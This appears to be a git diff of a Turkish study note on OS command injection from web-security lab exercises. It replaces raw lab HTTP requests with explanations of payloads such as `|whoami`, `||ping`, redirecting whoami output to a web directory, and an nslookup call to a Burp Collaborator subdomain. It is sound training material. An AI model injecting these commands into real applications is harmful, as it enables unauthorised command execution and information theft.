@@ -1,82 +1,18 @@
-# OS Command İnjection
+# OS Command Injection
 
-POST /product/stock HTTP/2
-Host: 0aae003104c870bc8028f88c0004007c.web-security-academy.net
-Cookie: session=fSpUfeKTqjgNuR5I8VTgnH5RMQsrSoy7
-Content-Length: 27
-Sec-Ch-Ua-Platform: "Linux"
-Accept-Language: tr-TR,tr;q=0.9
-Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
-Content-Type: application/x-www-form-urlencoded
-Sec-Ch-Ua-Mobile: ?0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Accept: */*
-Origin: https://0aae003104c870bc8028f88c0004007c.web-security-academy.net
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://0aae003104c870bc8028f88c0004007c.web-security-academy.net/product?productId=4
-Accept-Encoding: gzip, deflate, br
-Priority: u=1, i
- 
-productId=4&storeId=1|whoami
+- OS Command Injection (Komut Enjeksiyonu), bir saldırganın bir web uygulamasının sistem komutlarını çalıştırmasına izin veren bir güvenlik açığıdır. Bu açık, web uygulamasının kullanıcı girdilerini doğrulamaması veya filtrelememesi nedeniyle ortaya çıkar. Kullanıcı girişi, bir sistem komutunu tetikleyecek şekilde manipüle edilebilir, bu da saldırganın sunucunun işletim sistemini kontrol etmesine olanak tanır.
 
+###### Stock Güncelleme
+- `productId=4&storeId=1|whoami`
+- Bu istek, `storeId` parametresine `|whoami` komutunu ekliyor. `|` karakteri, bir komutun çıktısını başka bir komuta yönlendiren bir operatördür. Eğer sunucu bu parametreyi düzgün filtrelemezse, `whoami` komutu çalıştırılır ve sistemin hangi kullanıcı altında çalıştığı belirlenir.
 
--- 
+###### Feedback Gönderme
+- `email=x||ping+-c+10+127.0.0.1||&`
+- Burada, `email` parametresine `||ping -c 10 127.0.0.1` eklenmiş. `||` karakteri, önceki komutun çıktısını yok sayarak yeni bir komut çalıştırır. Bu örnekte, `ping` komutu çalıştırılır ve hedef IP adresine ping gönderilir. Bu tür bir saldırı, sunucuda ağ testi yapmak veya sistemdeki zayıflıkları keşfetmek için kullanılabilir.
 
-- bir submit feedback gönder
+- `email=||whoami>/var/www/images/output.txt||&`
+- Bu istekte, `whoami` komutunun çıktısı, `output.txt` dosyasına yönlendirilmiştir. Eğer sunucu, kullanıcı girdisini düzgün şekilde kontrol etmezse, bu komut çalıştırılabilir ve sistemdeki kullanıcı adı gibi hassas bilgiler `output.txt` dosyasına yazılabilir.
 
-POST /feedback/submit HTTP/2
-Host: 0a0a009b03c7e17082b07f5100e80039.web-security-academy.net
-Cookie: session=BWm8DHMMdQj94thbQv4U3fodYL2mgw7v
-Content-Length: 88
-Sec-Ch-Ua-Platform: "Linux"
-Accept-Language: tr-TR,tr;q=0.9
-Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
-Content-Type: application/x-www-form-urlencoded
-Sec-Ch-Ua-Mobile: ?0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Accept: */*
-Origin: https://0a0a009b03c7e17082b07f5100e80039.web-security-academy.net
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://0a0a009b03c7e17082b07f5100e80039.web-security-academy.net/feedback
-Accept-Encoding: gzip, deflate, br
-Priority: u=1, i
- 
-csrf=79Rg6FG7744BVzNqa4U0TXNMubwKHDWE&name=aa&email=x||ping+-c+10+127.0.0.1||&
-subject=aa&message=aa
-
-
---
-
-
-POST /feedback/submit HTTP/2
-Host: 0ad800970442f41882cc47d900de001c.web-security-academy.net
-Cookie: session=OEgjRiylY6EZsYy1vkbCax0zTbfcPoes
-Content-Length: 88
-Sec-Ch-Ua-Platform: "Linux"
-Accept-Language: tr-TR,tr;q=0.9
-Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
-Content-Type: application/x-www-form-urlencoded
-Sec-Ch-Ua-Mobile: ?0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Accept: */*
-Origin: https://0ad800970442f41882cc47d900de001c.web-security-academy.net
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://0ad800970442f41882cc47d900de001c.web-security-academy.net/feedback
-Accept-Encoding: gzip, deflate, br
-Priority: u=1, i
- 
-csrf=hKhdqGFo5fbvVUk0DEP4VDGnUIHn9dLg&name=aa&email=||whoami>/var/www/images/output.txt||&subject=aa&message=aa
-
-bir foto yükleme istedği yakalayıp filename=output.txt yapıyoruz.
-
-
---
-
-
-
+###### DNS Sorgulaması ile OS Command Injection
+- `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||&`
+- Burada, `email` parametresine `||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN` eklenmiş. `nslookup` komutu, DNS sorgusu yapmak için kullanılır. Bu örnekte, `BURP-COLLABORATOR-SUBDOMAIN` yerine, Burp Suite Collaborator alt alan adı belirtilmiştir. Bu, saldırganın hedef sistemden dışarıya doğru DNS sorgusu yapmasını sağlar ve genellikle hedef sunucunun hangi dış sunuculara sorgu gönderdiğini öğrenmek için kullanılır.
